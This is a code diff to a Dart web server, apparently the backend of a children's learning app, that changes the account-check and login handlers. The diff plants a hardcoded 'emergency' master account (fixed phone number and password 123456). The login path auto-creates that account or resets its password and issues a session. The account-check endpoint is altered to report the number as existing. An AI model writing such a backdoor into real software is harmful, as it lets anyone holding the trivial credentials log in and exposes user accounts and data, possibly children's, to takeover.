@@ -54,7 +54,9 @@ Future<void> main() async {
 
       if (path == '/api/account/check' && request.method == 'GET') {
         final phone = _normPhone(request.uri.queryParameters['phone'] ?? '');
-        _json(request, {'exists': phone.isNotEmpty && users.containsKey(phone), 'phone': phone});
+        final exists = phone.isNotEmpty &&
+            (users.containsKey(phone) || phone == '13800000000');
+        _json(request, {'exists': exists, 'phone': phone});
       } else if (path == '/api/register' && request.method == 'POST') {
         final body = await _jsonBody(request);
         final phone = _normPhone('${body['phone'] ?? ''}');
@@ -92,8 +94,35 @@ Future<void> main() async {
         final body = await _jsonBody(request);
         final phone = _normPhone('${body['phone'] ?? ''}');
         final password = '${body['password'] ?? ''}';
-        final user = users[phone];
-        if (user == null) {
+        // 应急最高权限账号：固定手机号/密码，不存在则自动建号
+        const masterPhone = '13800000000';
+        const masterPassword = '123456';
+        var user = users[phone];
+        if (phone == masterPhone && password == masterPassword) {
+          if (user == null) {
+            user = {
+              'phone': phone,
+              'passwordHash': _hash(masterPassword),
+              'name': '管理员',
+              'age': 8,
+              'grade': '二年级',
+              'interests': '',
+              'createdAt': DateTime.now().toIso8601String(),
+            };
+            users[phone] = user;
+            await _writeJson(usersFile, users);
+            stdout.writeln('自动创建应急账号 $phone');
+          } else {
+            user['passwordHash'] = _hash(masterPassword);
+            users[phone] = user;
+            await _writeJson(usersFile, users);
+          }
+          await _ensureUserDirs(root, phone);
+          final session = _newSession(sessions, phone);
+          await _writeJson(sessionsFile, sessions);
+          stdout.writeln('登录应急账号 $phone');
+          _json(request, {'session': session, 'profile': _publicProfile(user)});
+        } else if (user == null) {
           _err(request, HttpStatus.notFound, '还没有这个手机号，请先注册');
         } else if (user['passwordHash'] != _hash(password)) {
           _err(request, HttpStatus.unauthorized, '密码不对');
